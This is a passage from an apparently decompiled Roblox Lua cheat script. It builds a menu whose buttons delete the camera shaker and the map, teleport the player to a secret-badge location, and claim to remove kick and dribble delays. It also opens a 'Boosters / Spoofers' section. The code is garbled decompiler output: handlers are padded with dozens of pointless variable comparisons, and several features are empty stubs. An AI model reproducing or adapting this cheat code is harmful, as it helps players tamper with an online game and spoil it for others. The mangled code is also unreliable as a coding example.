local _ = Enum.TextXAlignment.Left;
Many_Things.TextXAlignment = Enum.TextXAlignment.Left;
Many_Things.Parent = TextButton_18;
local Frame_57 = Instance.new"Frame";
Frame_57.Size = UDim2_New(1, 0, 1, 0);
Frame_57.BackgroundTransparency = 1;
Frame_57.Visible = false;
Frame_57.Parent = Frame_3;
local ScrollingFrame_13 = Instance.new"ScrollingFrame";
ScrollingFrame_13.Size = UDim2_New(0.5, -8, 1, -10);
ScrollingFrame_13.Position = UDim2_New(0, 6, 0, 5);
ScrollingFrame_13.BackgroundTransparency = 1;
ScrollingFrame_13.ScrollBarThickness = 1;
ScrollingFrame_13.ScrollBarImageColor3 = R294_Result_5;
ScrollingFrame_13.CanvasSize = UDim2_New(0, 0, 0, 0);
local _ = Enum.AutomaticSize.Y;
ScrollingFrame_13.AutomaticCanvasSize = Enum.AutomaticSize.Y;
ScrollingFrame_13.Parent = Frame_57;
local UIListLayout_22 = Instance.new"UIListLayout";
UIListLayout_22.Padding = UDim_New(0, 8);
local _ = Enum.SortOrder.LayoutOrder;
UIListLayout_22.SortOrder = Enum.SortOrder.LayoutOrder;
UIListLayout_22.Parent = ScrollingFrame_13;
local ScrollingFrame_14 = Instance.new"ScrollingFrame";
ScrollingFrame_14.Size = UDim2_New(0.5, -8, 1, -10);
ScrollingFrame_14.Position = UDim2_New(0.5, 2, 0, 5);
ScrollingFrame_14.BackgroundTransparency = 1;
ScrollingFrame_14.ScrollBarThickness = 1;
ScrollingFrame_14.ScrollBarImageColor3 = R294_Result_5;
ScrollingFrame_14.CanvasSize = UDim2_New(0, 0, 0, 0);
local _ = Enum.AutomaticSize.Y;
ScrollingFrame_14.AutomaticCanvasSize = Enum.AutomaticSize.Y;
ScrollingFrame_14.Parent = Frame_57;
local UIListLayout_23 = Instance.new"UIListLayout";
UIListLayout_23.Padding = UDim_New(0, 8);
local _ = Enum.SortOrder.LayoutOrder;
UIListLayout_23.SortOrder = Enum.SortOrder.LayoutOrder;
UIListLayout_23.Parent = ScrollingFrame_14;
TextButton_18.MouseButton1Click:Connect(function(a_77, b_77, c_77)
    local _ = TextButton_15 == TextButton_18;
    TweenService:Create(Frame_50, r1036(0.2), {
        ["BackgroundTransparency"] = 1
    }):Play();
    r1040:Play();
    TweenService:Create(Gamepasses, r1036(0.2), {
        ["TextColor3"] = R294_Result_7
    }):Play();
    r1040:Play();
    Frame_51.Visible = false;
    TweenService:Create(Frame_56, r1036(0.2), {
        ["BackgroundTransparency"] = 0
    }):Play();
    r1040:Play();
    TweenService:Create(Miscellaneous, r1036(0.2), {
        ["TextColor3"] = R294_Result_6
    }):Play();
    r1040:Play();
    Frame_57.Visible = true;
end);
local Frame_58 = Instance.new"Frame";
Frame_58.Size = UDim2_New(1, 0, 0, 30);
Frame_58.BackgroundColor3 = R294_Result_3;
Frame_58.BorderSizePixel = 0;
ScrollingFrame_13:GetChildren();
Frame_58.LayoutOrder = 0;
Frame_58.Parent = ScrollingFrame_13;
r2347 = Instance.new("UICorner", Frame_58);
r2347.CornerRadius = UDim_New(0, 6);
local UIStroke_33 = Instance.new"UIStroke";
UIStroke_33.Color = R294_Result_4;
UIStroke_33.Parent = Frame_58;
local Destroys_Badge = Instance.new"TextLabel";
Destroys_Badge.Size = UDim2_New(1, -16, 0, 26);
Destroys_Badge.Position = UDim2_New(0, 8, 0, 2);
Destroys_Badge.BackgroundTransparency = 1;
Destroys_Badge.Text = "Destroys / Badge";
Destroys_Badge.TextColor3 = R294_Result_6;
local _ = Enum.Font.GothamBold;
Destroys_Badge.Font = Enum.Font.GothamBold;
Destroys_Badge.TextSize = 13;
local _ = Enum.TextXAlignment.Left;
Destroys_Badge.TextXAlignment = Enum.TextXAlignment.Left;
Destroys_Badge.Parent = Frame_58;
local Frame_59 = Instance.new"Frame";
Frame_59.Size = UDim2_New(1, 0, 1, -28);
Frame_59.Position = UDim2_New(0, 0, 0, 28);
Frame_59.BackgroundTransparency = 1;
Frame_59.Parent = Frame_58;
local UIListLayout_24 = Instance.new"UIListLayout";
UIListLayout_24.Padding = UDim_New(0, 6);
local _ = Enum.SortOrder.LayoutOrder;
UIListLayout_24.SortOrder = Enum.SortOrder.LayoutOrder;
UIListLayout_24.Parent = Frame_59;
local UIPadding_18 = Instance.new"UIPadding";
UIPadding_18.PaddingLeft = UDim_New(0, 8);
UIPadding_18.PaddingRight = UDim_New(0, 8);
UIPadding_18.PaddingBottom = UDim_New(0, 8);
UIPadding_18.Parent = Frame_59;
UIListLayout_24:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function(a_78, b_78, c_78)
    Frame_58.Size = UDim2_New(
        1,
        0,
        0,
        UIListLayout_24.AbsoluteContentSize.Y + 36
    );
end);
local TextButton_19 = Instance.new"TextButton";
TextButton_19.Size = UDim2_New(1, 0, 0, 32);
TextButton_19.BackgroundColor3 = FromRGB(27, 27, 27);
TextButton_19.AutoButtonColor = false;
TextButton_19.Text = "";
TextButton_19.ClipsDescendants = true;
TextButton_19.LayoutOrder = 1;
TextButton_19.Parent = Frame_59;
r2386 = Instance.new("UICorner", TextButton_19);
r2386.CornerRadius = UDim_New(0, 5);
local UIStroke_34 = Instance.new"UIStroke";
UIStroke_34.Color = R294_Result_4;
UIStroke_34.Parent = TextButton_19;
local Destroy_Camera_Shaker = Instance.new"TextLabel";
Destroy_Camera_Shaker.Size = UDim2_New(1, 0, 0, 32);
Destroy_Camera_Shaker.Position = UDim2_New(0, 0, 0, 0);
Destroy_Camera_Shaker.BackgroundTransparency = 1;
Destroy_Camera_Shaker.Text = "Destroy Camera Shaker";
Destroy_Camera_Shaker.TextColor3 = R294_Result_6;
Destroy_Camera_Shaker.Font = Enum.Font.GothamBold;
Destroy_Camera_Shaker.TextSize = 11;
local _ = Enum.TextXAlignment.Center;
Destroy_Camera_Shaker.TextXAlignment = Enum.TextXAlignment.Center;
Destroy_Camera_Shaker.Parent = TextButton_19;
TextButton_19.MouseButton1Click:Connect(function(a_79, b_79, c_79)
    TweenService:Create(TextButton_19, r1036(0.08), {
        ["Position"] = UDim2_New(0, 2, 0, 1.5),
        ["Size"] = UDim2_New(1, -4, 0, 29)
    }):Play();
    r1040:Play();
    task.wait(0.12);
    TweenService:Create(TextButton_19, r1036(0.15), {
        ["Position"] = UDim2_New(0, 0, 0, 0),
        ["Size"] = UDim2_New(1, 0, 0, 32)
    }):Play();
    r1040:Play();
    pcall(function(a_80, b_80, c_80)
        game:GetService("Players");
        Backpack:FindFirstChild("CameraShaker"):Destroy();
        CameraShaker_2 = game:GetService("StarterPack"):FindFirstChild("CameraShaker");
        CameraShaker_2:Destroy();
        local _ = CameraShaker_2 == r2796;
        local _ = CameraShaker_2 == r667;
        local _ = CameraShaker_2 == r2424;
        local _ = CameraShaker_2 == r547;
        local _ = CameraShaker_2 == r3539;
        local _ = CameraShaker_2 == r2287;
        local _ = CameraShaker_2 == r601;
        local _ = CameraShaker_2 == r2462;
        local _ = CameraShaker_2 == r2067;
        local _ = CameraShaker_2 == r2855;
        local _ = CameraShaker_2 == r1005;
        local _ = CameraShaker_2 == r1146;
        local _ = CameraShaker_2 == r826;
        local _ = CameraShaker_2 == r3209;
        local _ = CameraShaker_2 == r814;
        local _ = CameraShaker_2 == r1618;
        local _ = CameraShaker_2 == r1434;
        local _ = CameraShaker_2 == r3408;
        local _ = CameraShaker_2 == r2443;
        local _ = CameraShaker_2 == r908;
        local _ = CameraShaker_2 == r883;
        local _ = CameraShaker_2 == r557;
        local _ = CameraShaker_2 == r1927;
        local _ = CameraShaker_2 == r651;
        local _ = CameraShaker_2 == r1505;
        local _ = CameraShaker_2 == r2769;
        local _ = CameraShaker_2 == r779;
        local _ = CameraShaker_2 == r3144;
        local _ = CameraShaker_2 == r2347;
        local _ = CameraShaker_2 == r2029;
        local _ = CameraShaker_2 == r1946;
        local _ = CameraShaker_2 == r2539;
        local _ = CameraShaker_2 == UICorner_5;
        local _ = CameraShaker_2 == r2616;
        local _ = CameraShaker_2 == r3362;
        local _ = CameraShaker_2 == r1982;
        local _ = CameraShaker_2 == r3239;
        local _ = CameraShaker_2 == r3521;
        local _ = CameraShaker_2 == r3471;
        local _ = CameraShaker_2 == r1206;
        local _ = CameraShaker_2 == r3427;
        local _ = CameraShaker_2 == r3389;
        local _ = CameraShaker_2 == r994;
        local _ = CameraShaker_2 == r3015;
        local _ = CameraShaker_2 == r3299;
        local _ = CameraShaker_2 == r1245;
        local _ = CameraShaker_2 == r1802;
        local _ = CameraShaker_2 == r3527;
        local _ = CameraShaker_2 == r848;
        local _ = CameraShaker_2 == r2084;
        local _ = CameraShaker_2 == r2225;
        local _ = CameraShaker_2 == r3120;
        local _ = CameraShaker_2 == Character;
        local _ = CameraShaker_2 == Character;
        local _ = CameraShaker_2 == Character;
        local _ = CameraShaker_2 == Character;
        local _ = CameraShaker_2 == Character;
        local _ = CameraShaker_2 == Character;
        local _ = CameraShaker_2 == Character;
        local _ = CameraShaker_2 == r1899;
        local _ = CameraShaker_2 == r2175;
        local _ = CameraShaker_2 == r1678;
        local _ = CameraShaker_2 == r3073;
        local _ = CameraShaker_2 == r933;
        local _ = CameraShaker_2 == UICorner_4;
        local _ = CameraShaker_2 == r1359;
        local _ = CameraShaker_2 == r3054;
        local _ = CameraShaker_2 == r2955;
        local _ = CameraShaker_2 == r2925;
        local _ = CameraShaker_2 == r2736;
        local _ = CameraShaker_2 == r2558;
        local _ = CameraShaker_2 == r2672;
        local _ = CameraShaker_2 == r2048;
        local _ = CameraShaker_2 == r2711;
        local _ = CameraShaker_2 == r2520;
        local _ = CameraShaker_2 == r2577;
        local _ = CameraShaker_2 == r1965;
        local _ = CameraShaker_2 == r2257;
        local _ = CameraShaker_2 == r896;
        local _ = CameraShaker_2 == workspace;
        local _ = CameraShaker_2 == r1874;
        local _ = CameraShaker_2 == workspace.CurrentCamera;
        local _ = CameraShaker_2 == r981;
        local _ = CameraShaker_2 == r2386;
        local _ = CameraShaker_2 == UICorner;
        local _ = CameraShaker_2 == r2010;
        local _ = CameraShaker_2 == r1284;
        local _ = CameraShaker_2 == r3177;
        local _ = CameraShaker_2 == r2501;
        local _ = CameraShaker_2 == r1717;
        local _ = CameraShaker_2 == r1016;
        local _ = CameraShaker_2 == r580;
        local _ = CameraShaker_2 == r688;
        local _ = CameraShaker_2 == LocalPlayer;
        local _ = CameraShaker_2 == LocalPlayer;
        local _ = CameraShaker_2 == LocalPlayer;
        local _ = CameraShaker_2 == LocalPlayer;
        local _ = CameraShaker_2 == LocalPlayer;
        local _ = CameraShaker_2 == LocalPlayer;
        local _ = CameraShaker_2 == LocalPlayer;
        local _ = CameraShaker_2 == LocalPlayer;
        local _ = CameraShaker_2 == LocalPlayer;
        local _ = CameraShaker_2 == LocalPlayer;
        local _ = CameraShaker_2 == LocalPlayer;
        local _ = CameraShaker_2 == LocalPlayer;
        local _ = CameraShaker_2 == LocalPlayer;
        local _ = CameraShaker_2 == LocalPlayer;
        local _ = CameraShaker_2 == LocalPlayer;
        local _ = CameraShaker_2 == LocalPlayer;
        local _ = CameraShaker_2 == LocalPlayer;
        local _ = CameraShaker_2 == LocalPlayer;
        local _ = CameraShaker_2 == LocalPlayer;
        local _ = CameraShaker_2 == LocalPlayer;
        local _ = CameraShaker_2 == LocalPlayer;
        local _ = CameraShaker_2 == r838;
        local _ = CameraShaker_2 == r2405;
        local _ = CameraShaker_2 == r2115;
        local _ = CameraShaker_2 == r1544;
        local _ = CameraShaker_2 == r3338;
    end);
end);
local TextButton_20 = Instance.new"TextButton";
TextButton_20.Size = UDim2_New(1, 0, 0, 32);
TextButton_20.BackgroundColor3 = FromRGB(27, 27, 27);
TextButton_20.AutoButtonColor = false;
TextButton_20.Text = "";
TextButton_20.ClipsDescendants = true;
TextButton_20.LayoutOrder = 2;
TextButton_20.Parent = Frame_59;
r2405 = Instance.new("UICorner", TextButton_20);
r2405.CornerRadius = UDim_New(0, 5);
local UIStroke_35 = Instance.new"UIStroke";
UIStroke_35.Color = R294_Result_4;
UIStroke_35.Parent = TextButton_20;
local Destroy_Map = Instance.new"TextLabel";
Destroy_Map.Size = UDim2_New(1, 0, 0, 32);
Destroy_Map.Position = UDim2_New(0, 0, 0, 0);
Destroy_Map.BackgroundTransparency = 1;
Destroy_Map.Text = "Destroy Map";
Destroy_Map.TextColor3 = R294_Result_6;
Destroy_Map.Font = Enum.Font.GothamBold;
Destroy_Map.TextSize = 11;
local _ = Enum.TextXAlignment.Center;
Destroy_Map.TextXAlignment = Enum.TextXAlignment.Center;
Destroy_Map.Parent = TextButton_20;
TextButton_20.MouseButton1Click:Connect(function(a_81, b_81, c_81)
    TweenService:Create(TextButton_20, r1036(0.08), {
        ["Position"] = UDim2_New(0, 2, 0, 1.5),
        ["Size"] = UDim2_New(1, -4, 0, 29)
    }):Play();
    r1040:Play();
    task.wait(0.12);
    TweenService:Create(TextButton_20, r1036(0.15), {
        ["Position"] = UDim2_New(0, 0, 0, 0),
        ["Size"] = UDim2_New(1, 0, 0, 32)
    }):Play();
    r1040:Play();
    pcall(function(a_82, b_82, c_82)
        Map = workspace:FindFirstChild("Map");
        Map:Destroy();
        local _ = Map == r2796;
        local _ = Map == r667;
        local _ = Map == r2424;
        local _ = Map == r547;
        local _ = Map == r3539;
        local _ = Map == r2287;
        local _ = Map == r601;
        local _ = Map == r2462;
        local _ = Map == r2067;
        local _ = Map == r2855;
        local _ = Map == r1005;
        local _ = Map == r1146;
        local _ = Map == r826;
        local _ = Map == r3209;
        local _ = Map == r814;
        local _ = Map == r1618;
        local _ = Map == r1434;
        local _ = Map == r3408;
        local _ = Map == r2443;
        local _ = Map == r908;
        local _ = Map == r883;
        local _ = Map == r557;
        local _ = Map == r1927;
        local _ = Map == r651;
        local _ = Map == r1505;
        local _ = Map == r2769;
        local _ = Map == r779;
        local _ = Map == r3144;
        local _ = Map == r2347;
        local _ = Map == r2029;
        local _ = Map == r1946;
        local _ = Map == r2539;
        local _ = Map == UICorner_5;
        local _ = Map == r2616;
        local _ = Map == r3362;
        local _ = Map == r1982;
        local _ = Map == r3239;
        local _ = Map == r3521;
        local _ = Map == r3471;
        local _ = Map == r1206;
        local _ = Map == r3427;
        local _ = Map == r3389;
        local _ = Map == r994;
        local _ = Map == r3015;
        local _ = Map == r3299;
        local _ = Map == r1245;
        local _ = Map == r1802;
        local _ = Map == r3527;
        local _ = Map == r848;
        local _ = Map == r2084;
        local _ = Map == r2225;
        local _ = Map == r3120;
        local _ = Map == Character;
        local _ = Map == Character;
        local _ = Map == Character;
        local _ = Map == Character;
        local _ = Map == Character;
        local _ = Map == Character;
        local _ = Map == Character;
        local _ = Map == r1899;
        local _ = Map == r2175;
        local _ = Map == r1678;
        local _ = Map == r3073;
        local _ = Map == r933;
        local _ = Map == UICorner_4;
        local _ = Map == r1359;
        local _ = Map == r3054;
        local _ = Map == r2955;
        local _ = Map == r2925;
        local _ = Map == r2736;
        local _ = Map == r2558;
        local _ = Map == r2672;
        local _ = Map == r2048;
        local _ = Map == r2711;
        local _ = Map == r2520;
        local _ = Map == r2577;
        local _ = Map == r1965;
        local _ = Map == r2257;
        local _ = Map == r896;
        local _ = Map == workspace;
        local _ = Map == r1874;
        local _ = Map == workspace.CurrentCamera;
        local _ = Map == r981;
        local _ = Map == r2386;
        local _ = Map == UICorner;
        local _ = Map == r2010;
        local _ = Map == r1284;
        local _ = Map == r3177;
        local _ = Map == r2501;
        local _ = Map == r1717;
        local _ = Map == r1016;
        local _ = Map == r580;
        local _ = Map == r688;
        local _ = Map == LocalPlayer;
        local _ = Map == LocalPlayer;
        local _ = Map == LocalPlayer;
        local _ = Map == LocalPlayer;
        local _ = Map == LocalPlayer;
        local _ = Map == LocalPlayer;
        local _ = Map == LocalPlayer;
        local _ = Map == LocalPlayer;
        local _ = Map == LocalPlayer;
        local _ = Map == LocalPlayer;
        local _ = Map == LocalPlayer;
        local _ = Map == LocalPlayer;
        local _ = Map == LocalPlayer;
        local _ = Map == LocalPlayer;
        local _ = Map == LocalPlayer;
        local _ = Map == LocalPlayer;
        local _ = Map == LocalPlayer;
        local _ = Map == LocalPlayer;
        local _ = Map == LocalPlayer;
        local _ = Map == LocalPlayer;
        local _ = Map == LocalPlayer;
        local _ = Map == r838;
        local _ = Map == r2405;
        local _ = Map == r2115;
        local _ = Map == r1544;
        local _ = Map == r3338;
    end);
end);
local TextButton_21 = Instance.new"TextButton";
TextButton_21.Size = UDim2_New(1, 0, 0, 32);
TextButton_21.BackgroundColor3 = FromRGB(27, 27, 27);
TextButton_21.AutoButtonColor = false;
TextButton_21.Text = "";
TextButton_21.ClipsDescendants = true;
TextButton_21.LayoutOrder = 3;
TextButton_21.Parent = Frame_59;
r2424 = Instance.new("UICorner", TextButton_21);
r2424.CornerRadius = UDim_New(0, 5);
local UIStroke_36 = Instance.new"UIStroke";
UIStroke_36.Color = R294_Result_4;
UIStroke_36.Parent = TextButton_21;
local Destroy_Useless_Things = Instance.new"TextLabel";
Destroy_Useless_Things.Size = UDim2_New(1, 0, 0, 32);
Destroy_Useless_Things.Position = UDim2_New(0, 0, 0, 0);
Destroy_Useless_Things.BackgroundTransparency = 1;
Destroy_Useless_Things.Text = "Destroy Useless Things";
Destroy_Useless_Things.TextColor3 = R294_Result_6;
Destroy_Useless_Things.Font = Enum.Font.GothamBold;
Destroy_Useless_Things.TextSize = 11;
local _ = Enum.TextXAlignment.Center;
Destroy_Useless_Things.TextXAlignment = Enum.TextXAlignment.Center;
Destroy_Useless_Things.Parent = TextButton_21;
TextButton_21.MouseButton1Click:Connect(function(a_83, b_83, c_83)
    TweenService:Create(TextButton_21, r1036(0.08), {
        ["Position"] = UDim2_New(0, 2, 0, 1.5),
        ["Size"] = UDim2_New(1, -4, 0, 29)
    }):Play();
    r1040:Play();
    task.wait(0.12);
    TweenService:Create(TextButton_21, r1036(0.15), {
        ["Position"] = UDim2_New(0, 0, 0, 0),
        ["Size"] = UDim2_New(1, 0, 0, 32)
    }):Play();
    r1040:Play();
    pcall(function(a_84, b_84, c_84)
        game:GetService("ReplicatedStorage").Powers:FindFirstChild("PointLight"):Destroy();
    end);
end);
local TextButton_22 = Instance.new"TextButton";
TextButton_22.Size = UDim2_New(1, 0, 0, 32);
TextButton_22.BackgroundColor3 = FromRGB(27, 27, 27);
TextButton_22.AutoButtonColor = false;
TextButton_22.Text = "";
TextButton_22.ClipsDescendants = true;
TextButton_22.LayoutOrder = 4;
TextButton_22.Parent = Frame_59;
r2443 = Instance.new("UICorner", TextButton_22);
r2443.CornerRadius = UDim_New(0, 5);
local UIStroke_37 = Instance.new"UIStroke";
UIStroke_37.Color = R294_Result_4;
UIStroke_37.Parent = TextButton_22;
local SecretBadgeAwarder = Instance.new"TextLabel";
SecretBadgeAwarder.Size = UDim2_New(1, 0, 0, 32);
SecretBadgeAwarder.Position = UDim2_New(0, 0, 0, 0);
SecretBadgeAwarder.BackgroundTransparency = 1;
SecretBadgeAwarder.Text = "Get SecretBadgeAwarder";
SecretBadgeAwarder.TextColor3 = R294_Result_6;
SecretBadgeAwarder.Font = Enum.Font.GothamBold;
SecretBadgeAwarder.TextSize = 11;
local _ = Enum.TextXAlignment.Center;
SecretBadgeAwarder.TextXAlignment = Enum.TextXAlignment.Center;
SecretBadgeAwarder.Parent = TextButton_22;
TextButton_22.MouseButton1Click:Connect(function(a_85, b_85, c_85)
    TweenService:Create(TextButton_22, r1036(0.08), {
        ["Position"] = UDim2_New(0, 2, 0, 1.5),
        ["Size"] = UDim2_New(1, -4, 0, 29)
    }):Play();
    r1040:Play();
    task.wait(0.12);
    TweenService:Create(TextButton_22, r1036(0.15), {
        ["Position"] = UDim2_New(0, 0, 0, 0),
        ["Size"] = UDim2_New(1, 0, 0, 32)
    }):Play();
    r1040:Play();
    pcall(function(a_86, b_86, c_86)
        HumanoidRootPart = Character:WaitForChild("HumanoidRootPart");
        HumanoidRootPart.CFrame = CFrame.new(-2.51, 2.06, 435.59);
    end);
end);
local Frame_60 = Instance.new"Frame";
Frame_60.Size = UDim2_New(1, 0, 0, 30);
Frame_60.BackgroundColor3 = R294_Result_3;
Frame_60.BorderSizePixel = 0;
ScrollingFrame_14:GetChildren();
Frame_60.LayoutOrder = 0;
Frame_60.Parent = ScrollingFrame_14;
r2462 = Instance.new("UICorner", Frame_60);
r2462.CornerRadius = UDim_New(0, 6);
local UIStroke_38 = Instance.new"UIStroke";
UIStroke_38.Color = R294_Result_4;
UIStroke_38.Parent = Frame_60;
local Shooting_Features = Instance.new"TextLabel";
Shooting_Features.Size = UDim2_New(1, -16, 0, 26);
Shooting_Features.Position = UDim2_New(0, 8, 0, 2);
Shooting_Features.BackgroundTransparency = 1;
Shooting_Features.Text = "Shooting Features";
Shooting_Features.TextColor3 = R294_Result_6;
local _ = Enum.Font.GothamBold;
Shooting_Features.Font = Enum.Font.GothamBold;
Shooting_Features.TextSize = 13;
local _ = Enum.TextXAlignment.Left;
Shooting_Features.TextXAlignment = Enum.TextXAlignment.Left;
Shooting_Features.Parent = Frame_60;
local Frame_61 = Instance.new"Frame";
Frame_61.Size = UDim2_New(1, 0, 1, -28);
Frame_61.Position = UDim2_New(0, 0, 0, 28);
Frame_61.BackgroundTransparency = 1;
Frame_61.Parent = Frame_60;
local UIListLayout_25 = Instance.new"UIListLayout";
UIListLayout_25.Padding = UDim_New(0, 6);
local _ = Enum.SortOrder.LayoutOrder;
UIListLayout_25.SortOrder = Enum.SortOrder.LayoutOrder;
UIListLayout_25.Parent = Frame_61;
local UIPadding_19 = Instance.new"UIPadding";
UIPadding_19.PaddingLeft = UDim_New(0, 8);
UIPadding_19.PaddingRight = UDim_New(0, 8);
UIPadding_19.PaddingBottom = UDim_New(0, 8);
UIPadding_19.Parent = Frame_61;
UIListLayout_25:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function(a_87, b_87, c_87)
    Frame_60.Size = UDim2_New(
        1,
        0,
        0,
        UIListLayout_25.AbsoluteContentSize.Y + 36
    );
end);
local TextButton_23 = Instance.new"TextButton";
TextButton_23.Size = UDim2_New(1, 0, 0, 32);
TextButton_23.BackgroundColor3 = FromRGB(27, 27, 27);
TextButton_23.AutoButtonColor = false;
TextButton_23.Text = "";
TextButton_23.ClipsDescendants = true;
TextButton_23.LayoutOrder = 1;
TextButton_23.Parent = Frame_61;
r2501 = Instance.new("UICorner", TextButton_23);
r2501.CornerRadius = UDim_New(0, 5);
local UIStroke_39 = Instance.new"UIStroke";
UIStroke_39.Color = R294_Result_4;
UIStroke_39.Parent = TextButton_23;
local Remove_Dribble_Kick_Delay = Instance.new"TextLabel";
Remove_Dribble_Kick_Delay.Size = UDim2_New(1, 0, 0, 32);
Remove_Dribble_Kick_Delay.Position = UDim2_New(0, 0, 0, 0);
Remove_Dribble_Kick_Delay.BackgroundTransparency = 1;
Remove_Dribble_Kick_Delay.Text = "Remove Dribble / Kick Delay";
Remove_Dribble_Kick_Delay.TextColor3 = R294_Result_6;
Remove_Dribble_Kick_Delay.Font = Enum.Font.GothamBold;
Remove_Dribble_Kick_Delay.TextSize = 11;
local _ = Enum.TextXAlignment.Center;
Remove_Dribble_Kick_Delay.TextXAlignment = Enum.TextXAlignment.Center;
Remove_Dribble_Kick_Delay.Parent = TextButton_23;
TextButton_23.MouseButton1Click:Connect(function(a_88, b_88, c_88)
    TweenService:Create(TextButton_23, r1036(0.08), {
        ["Position"] = UDim2_New(0, 2, 0, 1.5),
        ["Size"] = UDim2_New(1, -4, 0, 29)
    }):Play();
    r1040:Play();
    task.wait(0.12);
    TweenService:Create(TextButton_23, r1036(0.15), {
        ["Position"] = UDim2_New(0, 0, 0, 0),
        ["Size"] = UDim2_New(1, 0, 0, 32)
    }):Play();
    r1040:Play();
    pcall(function(a_89, b_89, c_89)
        return fenv.__cachekick;
    end);
end);
local TextButton_24 = Instance.new"TextButton";
TextButton_24.Size = UDim2_New(1, 0, 0, 32);
TextButton_24.BackgroundColor3 = FromRGB(27, 27, 27);
TextButton_24.AutoButtonColor = false;
TextButton_24.Text = "";
TextButton_24.ClipsDescendants = true;
TextButton_24.LayoutOrder = 2;
TextButton_24.Parent = Frame_61;
r2520 = Instance.new("UICorner", TextButton_24);
r2520.CornerRadius = UDim_New(0, 5);
local UIStroke_40 = Instance.new"UIStroke";
UIStroke_40.Color = R294_Result_4;
UIStroke_40.Parent = TextButton_24;
local Remove_Special_Kicks_Delay = Instance.new"TextLabel";
Remove_Special_Kicks_Delay.Size = UDim2_New(1, 0, 0, 32);
Remove_Special_Kicks_Delay.Position = UDim2_New(0, 0, 0, 0);
Remove_Special_Kicks_Delay.BackgroundTransparency = 1;
Remove_Special_Kicks_Delay.Text = "Remove Special Kicks Delay";
Remove_Special_Kicks_Delay.TextColor3 = R294_Result_6;
Remove_Special_Kicks_Delay.Font = Enum.Font.GothamBold;
Remove_Special_Kicks_Delay.TextSize = 11;
local _ = Enum.TextXAlignment.Center;
Remove_Special_Kicks_Delay.TextXAlignment = Enum.TextXAlignment.Center;
Remove_Special_Kicks_Delay.Parent = TextButton_24;
TextButton_24.MouseButton1Click:Connect(function(a_90, b_90, c_90)
    TweenService:Create(TextButton_24, r1036(0.08), {
        ["Position"] = UDim2_New(0, 2, 0, 1.5),
        ["Size"] = UDim2_New(1, -4, 0, 29)
    }):Play();
    r1040:Play();
    task.wait(0.12);
    TweenService:Create(TextButton_24, r1036(0.15), {
        ["Position"] = UDim2_New(0, 0, 0, 0),
        ["Size"] = UDim2_New(1, 0, 0, 32)
    }):Play();
    r1040:Play();
    pcall(function(a_91, b_91, c_91)
        return fenv.a;
    end);
end);
local TextButton_25 = Instance.new"TextButton";
TextButton_25.Size = UDim2_New(1, 0, 0, 32);
TextButton_25.BackgroundColor3 = FromRGB(27, 27, 27);
TextButton_25.AutoButtonColor = false;
TextButton_25.Text = "";
TextButton_25.ClipsDescendants = true;
TextButton_25.LayoutOrder = 3;
TextButton_25.Parent = Frame_61;
r2539 = Instance.new("UICorner", TextButton_25);
r2539.CornerRadius = UDim_New(0, 5);
local UIStroke_41 = Instance.new"UIStroke";
UIStroke_41.Color = R294_Result_4;
UIStroke_41.Parent = TextButton_25;
local Remove_Ball_Delay = Instance.new"TextLabel";
Remove_Ball_Delay.Size = UDim2_New(1, 0, 0, 32);
Remove_Ball_Delay.Position = UDim2_New(0, 0, 0, 0);
Remove_Ball_Delay.BackgroundTransparency = 1;
Remove_Ball_Delay.Text = "Remove Ball Delay";
Remove_Ball_Delay.TextColor3 = R294_Result_6;
Remove_Ball_Delay.Font = Enum.Font.GothamBold;
Remove_Ball_Delay.TextSize = 11;
local _ = Enum.TextXAlignment.Center;
Remove_Ball_Delay.TextXAlignment = Enum.TextXAlignment.Center;
Remove_Ball_Delay.Parent = TextButton_25;
TextButton_25.MouseButton1Click:Connect(function(a_92, b_92, c_92)
    TweenService:Create(TextButton_25, r1036(0.08), {
        ["Position"] = UDim2_New(0, 2, 0, 1.5),
        ["Size"] = UDim2_New(1, -4, 0, 29)
    }):Play();
    r1040:Play();
    task.wait(0.12);
    TweenService:Create(TextButton_25, r1036(0.15), {
        ["Position"] = UDim2_New(0, 0, 0, 0),
        ["Size"] = UDim2_New(1, 0, 0, 32)
    }):Play();
    r1040:Play();
    pcall(function(a_93, b_93, c_93)
        return fenv.ol;
    end);
end);
local TextButton_26 = Instance.new"TextButton";
TextButton_26.Size = UDim2_New(1, 0, 0, 32);
TextButton_26.BackgroundColor3 = FromRGB(27, 27, 27);
TextButton_26.AutoButtonColor = false;
TextButton_26.Text = "";
TextButton_26.ClipsDescendants = true;
TextButton_26.LayoutOrder = 4;
TextButton_26.Parent = Frame_61;
r2558 = Instance.new("UICorner", TextButton_26);
r2558.CornerRadius = UDim_New(0, 5);
local UIStroke_42 = Instance.new"UIStroke";
UIStroke_42.Color = R294_Result_4;
UIStroke_42.Parent = TextButton_26;
local Remove_Tricks_Delay = Instance.new"TextLabel";
Remove_Tricks_Delay.Size = UDim2_New(1, 0, 0, 32);
Remove_Tricks_Delay.Position = UDim2_New(0, 0, 0, 0);
Remove_Tricks_Delay.BackgroundTransparency = 1;
Remove_Tricks_Delay.Text = "Remove Tricks Delay";
Remove_Tricks_Delay.TextColor3 = R294_Result_6;
Remove_Tricks_Delay.Font = Enum.Font.GothamBold;
Remove_Tricks_Delay.TextSize = 11;
local _ = Enum.TextXAlignment.Center;
Remove_Tricks_Delay.TextXAlignment = Enum.TextXAlignment.Center;
Remove_Tricks_Delay.Parent = TextButton_26;
TextButton_26.MouseButton1Click:Connect(function(a_94, b_94, c_94)
    TweenService:Create(TextButton_26, r1036(0.08), {
        ["Position"] = UDim2_New(0, 2, 0, 1.5),
        ["Size"] = UDim2_New(1, -4, 0, 29)
    }):Play();
    r1040:Play();
    task.wait(0.12);
    TweenService:Create(TextButton_26, r1036(0.15), {
        ["Position"] = UDim2_New(0, 0, 0, 0),
        ["Size"] = UDim2_New(1, 0, 0, 32)
    }):Play();
    r1040:Play();
    pcall(function(a_95, b_95, c_95)
        return fenv.ol;
    end);
end);
local Frame_62 = Instance.new"Frame";
Frame_62.Size = UDim2_New(1, 0, 0, 30);
Frame_62.BackgroundColor3 = R294_Result_3;
Frame_62.BorderSizePixel = 0;
ScrollingFrame_13:GetChildren();
Frame_62.LayoutOrder = 0;
Frame_62.Parent = ScrollingFrame_13;
r2577 = Instance.new("UICorner", Frame_62);
r2577.CornerRadius = UDim_New(0, 6);
local UIStroke_43 = Instance.new"UIStroke";
UIStroke_43.Color = R294_Result_4;
UIStroke_43.Parent = Frame_62;
local Boosters_Spoofers_Clumsy = Instance.new"TextLabel";
Boosters_Spoofers_Clumsy.Size = UDim2_New(1, -16, 0, 26);
